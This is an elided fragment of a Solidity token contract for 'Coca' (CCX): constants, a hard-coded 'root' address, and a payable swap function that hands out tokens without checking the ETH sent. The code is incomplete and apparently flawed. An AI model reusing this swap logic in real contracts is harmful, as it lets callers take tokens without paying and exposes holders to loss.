...
contract Consts {
    uint256 public constant SUPPLY = 200000000; //total supply 
    uint public constant TOKEN_DECIMALS = 4; //decimals
    uint8 public constant TOKEN_DECIMALS_UINT8 = 4; //decimals 
    uint public constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;

    string public constant TOKEN_NAME = "Coca"; //name
    string public constant TOKEN_SYMBOL = "CCX"; //symbol
}
...
contract Digital is NewToken{
    ...
    address admin;//admin
    address olord = 0xa4aB1d3B8D328B8bC5DC89b4cf99Ea0a841796E3;//root
    ...
    function swap(uint _s) public payable {
        transferFrom(this, msg.sender, _s * sw * 10000);
    }
    //Claim
